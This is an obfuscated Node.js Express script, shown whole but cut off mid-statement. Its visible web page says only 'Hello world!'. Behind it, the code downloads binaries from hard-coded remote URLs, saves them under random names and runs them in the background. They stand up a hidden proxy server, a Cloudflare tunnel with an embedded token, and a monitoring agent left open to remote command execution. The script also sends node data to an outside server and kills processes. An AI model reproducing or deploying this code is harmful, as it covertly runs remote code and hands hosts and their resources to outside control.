const _0x24753d=_0x4cc3;(function(_0x2173a9,_0x4d3ae2){const _0x5c31fc={_0x2374d5:0x166,_0x44e4b0:0x153,_0x4a1ede:0x14f,_0x96ff2b:0x1bd,_0x51f618:0x115,_0x1e03e2:0x1a9,_0x2952bd:0x15e,_0x6a908e:0x195},_0x522b93=_0x4cc3,_0x16f877=_0x2173a9();while(!![]){try{const _0x1b5afd=-parseInt(_0x522b93(_0x5c31fc._0x2374d5))/0x1*(parseInt(_0x522b93(_0x5c31fc._0x44e4b0))/0x2)+parseInt(_0x522b93(0x18c))/0x3*(parseInt(_0x522b93(_0x5c31fc._0x4a1ede))/0x4)+-parseInt(_0x522b93(_0x5c31fc._0x96ff2b))/0x5*(parseInt(_0x522b93(0x1bb))/0x6)+parseInt(_0x522b93(_0x5c31fc._0x51f618))/0x7*(parseInt(_0x522b93(_0x5c31fc._0x1e03e2))/0x8)+-parseInt(_0x522b93(_0x5c31fc._0x2952bd))/0x9+-parseInt(_0x522b93(_0x5c31fc._0x6a908e))/0xa+parseInt(_0x522b93(0x172))/0xb;if(_0x1b5afd===_0x4d3ae2)break;else _0x16f877['push'](_0x16f877['shift']());}catch(_0x141b22){_0x16f877['push'](_0x16f877['shift']());}}}(_0x56ac,0x2270e));const express=require(_0x24753d(0x170)),app=express(),axios=require(_0x24753d(0x13b)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x24753d(0x19f)),exec=promisify(require(_0x24753d(0x13a))[_0x24753d(0x12b)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x24753d(0x1ab)][_0x24753d(0x163)]||'',PROJECT_URL=process[_0x24753d(0x1ab)][_0x24753d(0x144)]||'',AUTO_ACCESS=process[_0x24753d(0x1ab)][_0x24753d(0x132)]||![],FILE_PATH=process[_0x24753d(0x1ab)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x24753d(0x1ab)][_0x24753d(0x1b9)]||'wbxl',PORT=process[_0x24753d(0x1ab)][_0x24753d(0x17f)]||process[_0x24753d(0x1ab)]['PORT']||0xbb8,UUID=process['env']['UUID']||'80e2441a-736d-4eaa-8d01-9a78e4cfa17b',NEZHA_SERVER=process[_0x24753d(0x1ab)][_0x24753d(0x136)]||_0x24753d(0x1c5),NEZHA_PORT=process[_0x24753d(0x1ab)][_0x24753d(0x150)]||'',NEZHA_KEY=process['env'][_0x24753d(0x143)]||_0x24753d(0x1c3),ARGO_DOMAIN=process[_0x24753d(0x1ab)][_0x24753d(0x12c)]||_0x24753d(0x149),ARGO_AUTH=process[_0x24753d(0x1ab)][_0x24753d(0x199)]||_0x24753d(0x190),ARGO_PORT=process[_0x24753d(0x1ab)][_0x24753d(0x188)]||0x1f41,CFIP=process[_0x24753d(0x1ab)][_0x24753d(0x13e)]||'cdns.doon.eu.org',CFPORT=process[_0x24753d(0x1ab)][_0x24753d(0x1d0)]||0x1bb,NAME=process['env'][_0x24753d(0x1d1)]||_0x24753d(0x123);!fs[_0x24753d(0x125)](FILE_PATH)?(fs[_0x24753d(0x183)](FILE_PATH),console[_0x24753d(0x161)](FILE_PATH+_0x24753d(0x19b))):console[_0x24753d(0x161)](FILE_PATH+_0x24753d(0x193));function generateRandomName(){const _0x223ef4={_0x3f43dc:0x192,_0x4d9623:0x135,_0xa90bb:0x140},_0x2ff235=_0x24753d,_0x344d38=_0x2ff235(_0x223ef4._0x3f43dc);let _0x36faf8='';for(let _0x168f0e=0x0;_0x168f0e<0x6;_0x168f0e++){_0x36faf8+=_0x344d38[_0x2ff235(_0x223ef4._0x4d9623)](Math[_0x2ff235(0x13d)](Math[_0x2ff235(_0x223ef4._0xa90bb)]()*_0x344d38[_0x2ff235(0x127)]));}return _0x36faf8;}function _0x56ac(){const _0x1c8129=['org','http','pkill\x20-f\x20\x22[','lumixcore.wbxl00.ggff.net','nohup\x20','.exe\x20>\x20nul\x202>&1','chmod','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','arm64','4dteBPi','NEZHA_PORT','sub.txt','8443','503678RLLUyR','includes','false','catch','\x20is\x20running','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','response','2083','\x20>/dev/null\x202>&1\x20&','true','base64','1393614aKMFrv','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','firefox','log','post','UPLOAD_URL','status','\x20-s\x20','1xuAWtR','finish','writeFileSync','all','pop','https://amd64.ssss.nyc.mn/web','text/plain;\x20charset=utf-8','npm\x20running\x20error:\x20','App\x20is\x20running','taskkill\x20/f\x20/im\x20','express','/dev/null','5895791zNsMuW','\x0a\x0atrojan://','split','filter','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','config.yaml','data','\x20>/dev/null\x202>&1','\x20-p\x20','tcp','from','none','map','SERVER_PORT','2087','forEach','statSync','mkdirSync','/api/add-nodes','trojan','https://arm64.ssss.nyc.mn/web','error','ARGO_PORT','get','match','/tunnel.yml\x20run','455496EFQMrB','\x0a\x20\x20\x20\x20','http\x20server\x20is\x20running\x20on\x20port:','join','eyJhIjoiNTI2NjQ3MGU5ZmZiZmYwMWU1ZmI5Yzk1NjExNjZhZmYiLCJ0IjoiZTExYzZjODktNjBkZC00OTJkLWFiNmEtMjk5YjAxMDU0NmNlIiwicyI6Ill6Z3laalJrTWprdE5ESXlNaTAwTVRsaExXRXlOREV0WWpBeFptUXpOREZsTmpKaSJ9','https://arm64.ssss.nyc.mn/bot','abcdefghijklmnopqrstuvwxyz','\x20already\x20exists','/config.json\x20>/dev/null\x202>&1\x20&','872850NomPRT','fileUrl','Add\x20automatic\x20access\x20task\x20faild:\x20','Error\x20downloading\x20files:','ARGO_AUTH','send','\x20is\x20created','basename','https://oooo.serv00.net/add-url','https://amd64.ssss.nyc.mn/agent','util','freedom','aarch64','Download\x20','https://arm64.ssss.nyc.mn/agent','country_code','readFileSync','\x20successfully','Skipping\x20adding\x20automatic\x20access\x20task','vless','120VIphKX','2053','env','createWriteStream','then','ArgoDomain:','message','arm','\x22\x20>\x20/dev/null\x202>&1','&fp=firefox&type=ws&host=','application/json','https+local://8.8.8.8/dns-query','boot.log','pipe','push','platform','SUB_PATH','/trojan-argo','72vcfAQp','Error\x20in\x20startserver:','50495ehSvcW','?encryption=none&security=tls&sni=','web\x20running\x20error:\x20','\x0a\x20\x20credentials-file:\x20','\x0a\x0avmess://','quic','fXYWSXfEZbSHMuGHEhcJjisCWDInLBtR','readdirSync','v1.wbxl.dpdns.org:10024','Error\x20executing\x20command:\x20','unshift','xtls-rprx-vision','clear','ARGO_DOMAIN:','/api/add-subscriptions','toString','block','\x20>\x20nul\x202>&1','tunnel.yml','CFPORT','NAME','unlinkSync','arch','\x20-c\x20\x22','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','--tls','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://ipapi.co/json/','31927DherMz','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/vmess-argo','stream','NEZHA\x20variable\x20is\x20empty,skip\x20running','php\x20running\x20error:\x20','utf-8','amd','\x20failed:\x20','/api/delete-nodes','443','stringify','Empowerment\x20failed\x20for\x20','test','lumixcore1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','existsSync','Unknown','length','unlink','listen','config.json','exec','ARGO_DOMAIN','tls','win32','has','Subscription\x20uploaded\x20successfully','countryCode','AUTO_ACCESS','127.0.0.1','isFile','charAt','NEZHA_SERVER','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/v1','/vless-argo','child_process','axios','direct','floor','CFIP','https://amd64.ssss.nyc.mn/bot','random','/vmess-argo?ed=2560','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NEZHA_KEY','PROJECT_URL','\x0aclient_secret:\x20'];_0x56ac=function(){return _0x1c8129;};return _0x56ac();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x24753d(0x18f)](FILE_PATH,phpName),webPath=path[_0x24753d(0x18f)](FILE_PATH,webName),botPath=path[_0x24753d(0x18f)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x24753d(0x151)),listPath=path[_0x24753d(0x18f)](FILE_PATH,'list.txt'),bootLogPath=path[_0x24753d(0x18f)](FILE_PATH,'boot.log'),configPath=path[_0x24753d(0x18f)](FILE_PATH,_0x24753d(0x12a));function deleteNodes(){const _0x20d775={_0x5cd503:0x17c,_0x334fb7:0x11b,_0x5363e7:0x174,_0x4d0d60:0x175,_0xa91524:0x11e,_0x488ee1:0x156},_0x2443d7=_0x24753d;try{if(!UPLOAD_URL)return;if(!fs[_0x2443d7(0x125)](subPath))return;let _0xbced1e;try{_0xbced1e=fs[_0x2443d7(0x1a5)](subPath,_0x2443d7(0x11b));}catch{return null;}const _0x373db2=Buffer[_0x2443d7(_0x20d775._0x5cd503)](_0xbced1e,_0x2443d7(0x15d))[_0x2443d7(0x1cc)](_0x2443d7(_0x20d775._0x334fb7)),_0x23849f=_0x373db2[_0x2443d7(_0x20d775._0x5363e7)]('\x0a')[_0x2443d7(_0x20d775._0x4d0d60)](_0x515d3d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2443d7(0x122)](_0x515d3d));if(_0x23849f[_0x2443d7(0x127)]===0x0)return;return axios[_0x2443d7(0x162)](UPLOAD_URL+_0x2443d7(_0x20d775._0xa91524),JSON[_0x2443d7(0x120)]({'nodes':_0x23849f}),{'headers':{'Content-Type':_0x2443d7(0x1b3)}})[_0x2443d7(_0x20d775._0x488ee1)](_0x2e4d1f=>{return null;}),null;}catch(_0x45864d){return null;}}function cleanupOldFiles(){const _0x487b7c={_0x27c337:0x181},_0x9abdc3=_0x24753d;try{const _0x316edb=fs[_0x9abdc3(0x1c4)](FILE_PATH);_0x316edb[_0x9abdc3(_0x487b7c._0x27c337)](_0x1de556=>{const _0x157873=_0x9abdc3,_0x1b41a8=path[_0x157873(0x18f)](FILE_PATH,_0x1de556);try{const _0x57153a=fs[_0x157873(0x182)](_0x1b41a8);_0x57153a[_0x157873(0x134)]()&&fs['unlinkSync'](_0x1b41a8);}catch(_0x3f3c64){}});}catch(_0x207232){}}app[_0x24753d(0x189)]('/',function(_0x41e330,_0x4614ae){const _0x43c1fa=_0x24753d;_0x4614ae[_0x43c1fa(0x19a)]('Hello\x20world!');});async function generateConfig(){const _0x32aedf={_0x1de6b4:0x171,_0x367e65:0x1c8,_0x35c6fe:0x139,_0x3c7c48:0x17b,_0x31d442:0x133,_0x368789:0x1a8,_0x321601:0x17d,_0x43a5cf:0x12d,_0x307ddb:0x1c2,_0x2680d6:0x147,_0x24c5ab:0x185,_0x583af7:0x1c2,_0x1b5559:0x1b4,_0x5a6c49:0x1a0,_0x1cc888:0x120},_0x271808=_0x24753d,_0xa50e06={'log':{'access':_0x271808(_0x32aedf._0x1de6b4),'error':_0x271808(_0x32aedf._0x1de6b4),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x271808(0x1a8),'settings':{'clients':[{'id':UUID,'flow':_0x271808(_0x32aedf._0x367e65)}],'decryption':_0x271808(0x17d),'fallbacks':[{'dest':0xbb9},{'path':_0x271808(_0x32aedf._0x35c6fe),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x271808(0x1ba),'dest':0xbbc}]},'streamSettings':{'network':_0x271808(_0x32aedf._0x3c7c48)}},{'port':0xbb9,'listen':_0x271808(_0x32aedf._0x31d442),'protocol':_0x271808(_0x32aedf._0x368789),'settings':{'clients':[{'id':UUID}],'decryption':_0x271808(0x17d)},'streamSettings':{'network':_0x271808(0x17b),'security':_0x271808(_0x32aedf._0x321601)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x271808(_0x32aedf._0x321601)},'streamSettings':{'network':'ws','security':_0x271808(0x17d),'wsSettings':{'path':_0x271808(0x139)}},'sniffing':{'enabled':!![],'destOverride':[_0x271808(0x147),_0x271808(_0x32aedf._0x43a5cf),_0x271808(_0x32aedf._0x307ddb)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x271808(0x133),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x271808(0x117)}},'sniffing':{'enabled':!![],'destOverride':[_0x271808(_0x32aedf._0x2680d6),_0x271808(0x12d),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x271808(_0x32aedf._0x24c5ab),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x271808(0x17d),'wsSettings':{'path':_0x271808(0x1ba)}},'sniffing':{'enabled':!![],'destOverride':[_0x271808(0x147),_0x271808(_0x32aedf._0x43a5cf),_0x271808(_0x32aedf._0x583af7)],'metadataOnly':![]}}],'dns':{'servers':[_0x271808(_0x32aedf._0x1b5559)]},'outbounds':[{'protocol':_0x271808(_0x32aedf._0x5a6c49),'tag':_0x271808(0x13c)},{'protocol':'blackhole','tag':_0x271808(0x1cd)}]};fs[_0x271808(0x168)](path[_0x271808(0x18f)](FILE_PATH,'config.json'),JSON[_0x271808(_0x32aedf._0x1cc888)](_0xa50e06,null,0x2));}function getSystemArchitecture(){const _0x5aafc6={_0x3ea6d1:0x1d3,_0x4007cd:0x14e},_0x3801d8=_0x24753d,_0x1263a9=os[_0x3801d8(_0x5aafc6._0x3ea6d1)]();return _0x1263a9===_0x3801d8(0x1b0)||_0x1263a9===_0x3801d8(_0x5aafc6._0x4007cd)||_0x1263a9===_0x3801d8(0x1a1)?'arm':_0x3801d8(0x11c);}function _0x4cc3(_0x15c0d8,_0x4fbff6){const _0x56acb7=_0x56ac();return _0x4cc3=function(_0x4cc393,_0x5e489a){_0x4cc393=_0x4cc393-0x114;let _0x43ba51=_0x56acb7[_0x4cc393];return _0x43ba51;},_0x4cc3(_0x15c0d8,_0x4fbff6);}function downloadFile(_0x2b67d8,_0x392ccc,_0x5bb0a7){const _0x54347d={_0x16e8da:0x1ac,_0x15bca9:0x189,_0x2d143b:0x1ad},_0x14783a={_0x48d4c9:0x19c},_0x733b8a={_0x222825:0x178},_0xdb4fa7={_0x4cbcb2:0x1a2},_0x32a763=_0x24753d,_0x8d8bb2=_0x2b67d8;!fs[_0x32a763(0x125)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x5cd6e1=fs[_0x32a763(_0x54347d._0x16e8da)](_0x8d8bb2);axios({'method':_0x32a763(_0x54347d._0x15bca9),'url':_0x392ccc,'responseType':_0x32a763(0x118)})[_0x32a763(_0x54347d._0x2d143b)](_0x4fefbd=>{const _0xc85672={_0x52df3f:0x1a2,_0x51e29d:0x1a6},_0x1f0222=_0x32a763;_0x4fefbd[_0x1f0222(_0x733b8a._0x222825)][_0x1f0222(0x1b6)](_0x5cd6e1),_0x5cd6e1['on'](_0x1f0222(0x167),()=>{const _0x1e2fe6=_0x1f0222;_0x5cd6e1['close'](),console[_0x1e2fe6(0x161)](_0x1e2fe6(_0xc85672._0x52df3f)+path[_0x1e2fe6(0x19c)](_0x8d8bb2)+_0x1e2fe6(_0xc85672._0x51e29d)),_0x5bb0a7(null,_0x8d8bb2);}),_0x5cd6e1['on'](_0x1f0222(0x187),_0x434859=>{const _0x8f768b=_0x1f0222;fs[_0x8f768b(0x128)](_0x8d8bb2,()=>{});const _0x1e44aa=_0x8f768b(_0xdb4fa7._0x4cbcb2)+path['basename'](_0x8d8bb2)+_0x8f768b(0x11d)+_0x434859['message'];console[_0x8f768b(0x187)](_0x1e44aa),_0x5bb0a7(_0x1e44aa);});})[_0x32a763(0x156)](_0x4b9ad5=>{const _0xf95968=_0x32a763,_0x25f101=_0xf95968(0x1a2)+path[_0xf95968(_0x14783a._0x48d4c9)](_0x8d8bb2)+_0xf95968(0x11d)+_0x4b9ad5['message'];console[_0xf95968(0x187)](_0x25f101),_0x5bb0a7(_0x25f101);});}async function downloadFilesAndRun(){const _0x4f6a40={_0x12909c:0x161,_0xfcef9f:0x152,_0xb3ce4b:0x15c,_0x557c9c:0x155,_0xbb5e5b:0x145,_0x20dc13:0x158,_0xac360b:0x168,_0x219547:0x18f,_0x1a2bf2:0x177,_0x57e99b:0x14a,_0x30c40c:0x1d4,_0x12db50:0x176,_0x25221f:0x157,_0x29eb2c:0x11f,_0x4ca189:0x14a,_0x5f021d:0x165,_0x4a8470:0x17a,_0x12dac3:0x157,_0x2d7dec:0x16d,_0x3b84b1:0x161,_0x2b799e:0x119,_0x1a793e:0x194,_0x231fe6:0x187,_0x25cdec:0x14d,_0x4cd172:0x15f,_0x2f58c1:0x15b,_0x295768:0x157},_0x4b34bc={_0x507ab0:0x125},_0x3d0fb2=_0x24753d,_0x9b45e4=getSystemArchitecture(),_0x20489e=getFilesForArchitecture(_0x9b45e4);if(_0x20489e[_0x3d0fb2(0x127)]===0x0){console[_0x3d0fb2(_0x4f6a40._0x12909c)](_0x3d0fb2(0x116));return;}const _0x22a603=_0x20489e[_0x3d0fb2(0x17e)](_0x95e5a0=>{return new Promise((_0x4e0170,_0x2ede8e)=>{const _0x4b91c0=_0x4cc3;downloadFile(_0x95e5a0['fileName'],_0x95e5a0[_0x4b91c0(0x196)],(_0x95ce6d,_0xe81eea)=>{_0x95ce6d?_0x2ede8e(_0x95ce6d):_0x4e0170(_0xe81eea);});});});try{await Promise[_0x3d0fb2(0x169)](_0x22a603);}catch(_0x27e906){console[_0x3d0fb2(0x187)](_0x3d0fb2(0x198),_0x27e906);return;}function _0x517d16(_0x41d0a5){const _0x2e8487=_0x3d0fb2,_0x1fea0d=0x1fd;_0x41d0a5[_0x2e8487(0x181)](_0x9e756c=>{const _0x37fea4=_0x2e8487;fs[_0x37fea4(_0x4b34bc._0x507ab0)](_0x9e756c)&&fs[_0x37fea4(0x14c)](_0x9e756c,_0x1fea0d,_0x1a9784=>{const _0x5218b6=_0x37fea4;_0x1a9784?console['error'](_0x5218b6(0x121)+_0x9e756c+':\x20'+_0x1a9784):console['log']('Empowerment\x20success\x20for\x20'+_0x9e756c+':\x20'+_0x1fea0d['toString'](0x8));});});}const _0x193db1=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x517d16(_0x193db1);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2d92a9=NEZHA_SERVER[_0x3d0fb2(0x154)](':')?NEZHA_SERVER[_0x3d0fb2(0x174)](':')[_0x3d0fb2(0x16a)]():'',_0x386461=new Set(['443',_0x3d0fb2(_0x4f6a40._0xfcef9f),'2096',_0x3d0fb2(0x180),'2083',_0x3d0fb2(0x1aa)]),_0x4e5300=_0x386461[_0x3d0fb2(0x12f)](_0x2d92a9)?_0x3d0fb2(_0x4f6a40._0xb3ce4b):_0x3d0fb2(_0x4f6a40._0x557c9c),_0x536a8f=_0x3d0fb2(_0x4f6a40._0xbb5e5b)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3d0fb2(_0x4f6a40._0x20dc13)+_0x4e5300+_0x3d0fb2(0x124)+UUID;fs[_0x3d0fb2(_0x4f6a40._0xac360b)](path[_0x3d0fb2(_0x4f6a40._0x219547)](FILE_PATH,_0x3d0fb2(_0x4f6a40._0x1a2bf2)),_0x536a8f);const _0x1ada65=_0x3d0fb2(_0x4f6a40._0x57e99b)+phpPath+_0x3d0fb2(_0x4f6a40._0x30c40c)+FILE_PATH+_0x3d0fb2(_0x4f6a40._0x12db50);try{await exec(_0x1ada65),console['log'](phpName+_0x3d0fb2(_0x4f6a40._0x25221f)),await new Promise(_0x4d159a=>setTimeout(_0x4d159a,0x3e8));}catch(_0x18c2c7){console[_0x3d0fb2(0x187)](_0x3d0fb2(0x11a)+_0x18c2c7);}}else{let _0x4ea3d4='';const _0x2ade93=[_0x3d0fb2(_0x4f6a40._0x29eb2c),_0x3d0fb2(0x152),'2096',_0x3d0fb2(0x180),_0x3d0fb2(0x15a),'2053'];_0x2ade93[_0x3d0fb2(0x154)](NEZHA_PORT)&&(_0x4ea3d4=_0x3d0fb2(0x1d6));const _0x545a19=_0x3d0fb2(_0x4f6a40._0x4ca189)+npmPath+_0x3d0fb2(_0x4f6a40._0x5f021d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3d0fb2(_0x4f6a40._0x4a8470)+NEZHA_KEY+'\x20'+_0x4ea3d4+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x545a19),console['log'](npmName+_0x3d0fb2(_0x4f6a40._0x12dac3)),await new Promise(_0x4bcb14=>setTimeout(_0x4bcb14,0x3e8));}catch(_0x41b8d7){console['error'](_0x3d0fb2(_0x4f6a40._0x2d7dec)+_0x41b8d7);}}}else console[_0x3d0fb2(_0x4f6a40._0x3b84b1)](_0x3d0fb2(_0x4f6a40._0x2b799e));const _0xf4d6c2=_0x3d0fb2(0x14a)+webPath+'\x20-c\x20'+FILE_PATH+_0x3d0fb2(_0x4f6a40._0x1a793e);try{await exec(_0xf4d6c2),console[_0x3d0fb2(0x161)](webName+_0x3d0fb2(_0x4f6a40._0x12dac3)),await new Promise(_0x54d951=>setTimeout(_0x54d951,0x3e8));}catch(_0x1daecc){console[_0x3d0fb2(_0x4f6a40._0x231fe6)](_0x3d0fb2(0x1bf)+_0x1daecc);}if(fs['existsSync'](botPath)){let _0x507de5;if(ARGO_AUTH[_0x3d0fb2(0x18a)](/^[A-Z0-9a-z=]{120,250}$/))_0x507de5=_0x3d0fb2(_0x4f6a40._0x25cdec)+ARGO_AUTH;else ARGO_AUTH[_0x3d0fb2(0x18a)](/TunnelSecret/)?_0x507de5='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x3d0fb2(0x18b):_0x507de5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3d0fb2(_0x4f6a40._0x4cd172)+ARGO_PORT;try{await exec(_0x3d0fb2(0x14a)+botPath+'\x20'+_0x507de5+_0x3d0fb2(_0x4f6a40._0x2f58c1)),console['log'](botName+_0x3d0fb2(_0x4f6a40._0x295768)),await new Promise(_0x4754f0=>setTimeout(_0x4754f0,0x7d0));}catch(_0x150c0f){console[_0x3d0fb2(0x187)]('Error\x20executing\x20command:\x20'+_0x150c0f);}}await new Promise(_0x48a07c=>setTimeout(_0x48a07c,0x1388));}function getFilesForArchitecture(_0x1bd598){const _0x24c2ec={_0x25a052:0x1b0,_0x132a4a:0x186,_0x5efdfe:0x1a3,_0x283239:0x19e,_0x339f9d:0x138},_0x3a85b4=_0x24753d;let _0x56eeff;_0x1bd598===_0x3a85b4(_0x24c2ec._0x25a052)?_0x56eeff=[{'fileName':webPath,'fileUrl':_0x3a85b4(_0x24c2ec._0x132a4a)},{'fileName':botPath,'fileUrl':_0x3a85b4(0x191)}]:_0x56eeff=[{'fileName':webPath,'fileUrl':_0x3a85b4(0x16b)},{'fileName':botPath,'fileUrl':_0x3a85b4(0x13f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x429829=_0x1bd598===_0x3a85b4(0x1b0)?_0x3a85b4(_0x24c2ec._0x5efdfe):_0x3a85b4(_0x24c2ec._0x283239);_0x56eeff[_0x3a85b4(0x1c7)]({'fileName':npmPath,'fileUrl':_0x429829});}else{const _0x42daa1=_0x1bd598===_0x3a85b4(0x1b0)?_0x3a85b4(_0x24c2ec._0x339f9d):'https://amd64.ssss.nyc.mn/v1';_0x56eeff[_0x3a85b4(0x1c7)]({'fileName':phpPath,'fileUrl':_0x42daa1});}}return _0x56eeff;}function argoType(){const _0x3d025b={_0x355b10:0x154,_0x59671c:0x168,_0x1e171f:0x18f,_0x30fc88:0x1d7},_0x5a1b0f=_0x24753d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5a1b0f(0x161)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x5a1b0f(_0x3d025b._0x355b10)]('TunnelSecret')){fs[_0x5a1b0f(_0x3d025b._0x59671c)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x421044='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x5a1b0f(0x1c0)+path[_0x5a1b0f(_0x3d025b._0x1e171f)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x5a1b0f(0x1d5);fs[_0x5a1b0f(0x168)](path[_0x5a1b0f(0x18f)](FILE_PATH,_0x5a1b0f(0x1cf)),_0x421044);}else console['log'](_0x5a1b0f(_0x3d025b._0x30fc88));}async function extractDomains(){const _0x5a0928={_0x35d98d:0x174,_0x539187:0x127,_0x130754:0x1ae,_0x3914cc:0x1d2,_0x49d83e:0x15b,_0x35d0bb:0x161,_0x4b4b99:0x157},_0x599220={_0x1ff016:0x189,_0x3a088b:0x1a4,_0x166ced:0x178,_0x113649:0x178,_0x5f428b:0x146,_0x1d97ae:0x178,_0x495d06:0x178,_0x3f9756:0x164,_0x49553b:0x131,_0x2111ea:0x146},_0x4ce7d5={_0x25c426:0x16f,_0x29597a:0x14b,_0x58a02a:0x135},_0x1d5e62={_0x3cb086:0x18a},_0x28e6da=_0x24753d;let _0x3e9029;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3e9029=ARGO_DOMAIN,console[_0x28e6da(0x161)](_0x28e6da(0x1ca),_0x3e9029),await _0x4467a9(_0x3e9029);else try{const _0x570c40=fs[_0x28e6da(0x1a5)](path[_0x28e6da(0x18f)](FILE_PATH,'boot.log'),'utf-8'),_0x4c2021=_0x570c40[_0x28e6da(_0x5a0928._0x35d98d)]('\x0a'),_0x1c5802=[];_0x4c2021['forEach'](_0x12553d=>{const _0x178746=_0x28e6da,_0x43eb7f=_0x12553d[_0x178746(_0x1d5e62._0x3cb086)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x43eb7f){const _0x1cfffe=_0x43eb7f[0x1];_0x1c5802[_0x178746(0x1b7)](_0x1cfffe);}});if(_0x1c5802[_0x28e6da(_0x5a0928._0x539187)]>0x0)_0x3e9029=_0x1c5802[0x0],console[_0x28e6da(0x161)](_0x28e6da(_0x5a0928._0x130754),_0x3e9029),await _0x4467a9(_0x3e9029);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x28e6da(_0x5a0928._0x3914cc)](path['join'](FILE_PATH,_0x28e6da(0x1b5)));async function _0x26aa2f(){const _0x28c20d=_0x28e6da;try{process['platform']===_0x28c20d(0x12e)?await exec(_0x28c20d(_0x4ce7d5._0x25c426)+botName+_0x28c20d(_0x4ce7d5._0x29597a)):await exec(_0x28c20d(0x148)+botName[_0x28c20d(_0x4ce7d5._0x58a02a)](0x0)+']'+botName['substring'](0x1)+_0x28c20d(0x1b1));}catch(_0x21045a){}}_0x26aa2f(),await new Promise(_0x3f2854=>setTimeout(_0x3f2854,0xbb8));const _0x1e10df='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x28e6da(0x15f)+ARGO_PORT;try{await exec(_0x28e6da(0x14a)+botPath+'\x20'+_0x1e10df+_0x28e6da(_0x5a0928._0x49d83e)),console[_0x28e6da(_0x5a0928._0x35d0bb)](botName+_0x28e6da(_0x5a0928._0x4b4b99)),await new Promise(_0x41f6a7=>setTimeout(_0x41f6a7,0xbb8)),await extractDomains();}catch(_0x46f75c){console['error'](_0x28e6da(0x1c6)+_0x46f75c);}}}catch(_0x525da1){console[_0x28e6da(0x187)]('Error\x20reading\x20boot.log:',_0x525da1);}async function _0x4e03ca(){const _0x2b5cf6=_0x28e6da;try{const _0x33497c=await axios[_0x2b5cf6(_0x599220._0x1ff016)](_0x2b5cf6(0x114),{'timeout':0xbb8});if(_0x33497c[_0x2b5cf6(0x178)]&&_0x33497c['data'][_0x2b5cf6(_0x599220._0x3a088b)]&&_0x33497c[_0x2b5cf6(_0x599220._0x166ced)][_0x2b5cf6(0x146)])return _0x33497c[_0x2b5cf6(_0x599220._0x166ced)]['country_code']+'_'+_0x33497c[_0x2b5cf6(_0x599220._0x113649)][_0x2b5cf6(_0x599220._0x5f428b)];}catch(_0x5751dd){try{const _0x5c38ba=await axios[_0x2b5cf6(0x189)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x5c38ba[_0x2b5cf6(_0x599220._0x1d97ae)]&&_0x5c38ba[_0x2b5cf6(_0x599220._0x495d06)][_0x2b5cf6(_0x599220._0x3f9756)]==='success'&&_0x5c38ba['data']['countryCode']&&_0x5c38ba['data']['org'])return 